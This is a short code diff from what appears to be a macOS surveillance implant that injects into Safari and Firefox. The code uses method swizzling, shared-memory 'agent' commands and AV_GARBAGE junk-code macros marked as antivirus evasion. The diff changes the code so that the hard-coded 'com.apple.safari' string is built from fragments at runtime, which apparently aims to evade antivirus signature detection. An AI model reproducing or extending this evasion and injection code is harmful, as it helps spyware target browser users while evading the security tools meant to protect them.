@@ -275,6 +275,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 
   // First thing we need to initialize the shared memory segments
   NSString *bundleIdentifier = [[NSBundle mainBundle] bundleIdentifier];
+  NSString *safariId = [NSString stringWithFormat:@"%@.%@.%@", @"com", @"apple", @"safari"];
   
   // AV evasion: only on release build
   AV_GARBAGE_005 
@@ -288,7 +289,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   AV_GARBAGE_006 
 
   // TODO: Use an exclusion list instead of this
-  if ([bundleIdentifier isEqualToString: @"com.apple.safari"] == YES)
+  if ([bundleIdentifier isEqualToString: safariId] == YES)
   {   
     // AV evasion: only on release build
     AV_GARBAGE_007 
@@ -1973,7 +1974,9 @@ if ([mSharedMemoryCommand createMemoryRegion] == -1)
 + (void)checkAgentAtOffset: (uint32_t)offset
 {
   NSMutableData *readData;
-  shMemoryCommand *shMemCommand;  
+  shMemoryCommand *shMemCommand;
+  
+  NSString *safariId = [NSString stringWithFormat:@"%@.%@.%@", @"com", @"apple", @"safari"];
   
   // AV evasion: only on release build
   AV_GARBAGE_001 
@@ -2009,7 +2012,7 @@ if ([mSharedMemoryCommand createMemoryRegion] == -1)
           // AV evasion: only on release build
           AV_GARBAGE_002
 
-          if ([identifier isCaseInsensitiveLike: @"com.apple.safari"] ||
+          if ([identifier isCaseInsensitiveLike: safariId] ||
               [identifier isCaseInsensitiveLike: @"org.mozilla.firefox"])
           {
 #ifdef DEBUG_INPUT_MANAGER
@@ -2033,7 +2036,7 @@ if ([mSharedMemoryCommand createMemoryRegion] == -1)
           // AV evasion: only on release build
           AV_GARBAGE_006 
 
-          if ([identifier isCaseInsensitiveLike: @"com.apple.safari"] ||
+          if ([identifier isCaseInsensitiveLike: safariId] ||
               [identifier isCaseInsensitiveLike: @"org.mozilla.firefox"])
           {   
             // AV evasion: only on release build
